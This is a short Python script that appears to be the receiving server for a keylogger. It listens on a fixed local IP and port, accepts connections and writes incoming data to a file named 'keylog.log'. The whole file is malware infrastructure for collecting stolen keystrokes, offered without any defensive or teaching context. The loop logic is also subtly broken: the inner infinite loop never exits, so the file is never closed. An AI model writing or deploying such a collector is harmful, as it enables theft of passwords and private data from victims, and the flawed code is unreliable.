import socket

s = socket.socket()
s.bind(("192.168.10.100",9999))
s.listen(1)

while True:
    sc, address = s.accept()

    print(address)
    i=1
    log_file = open('keylog.log','wb') #open in binary
    i=i+1
    while (True):       
    # receive data and write it to file
        l = sc.recv(4096)
        while (l):
                log_file.write(l)
                l = sc.recv(4096)
    log_file.close()
    print("Received keylog file")
    sc.close()

s.close()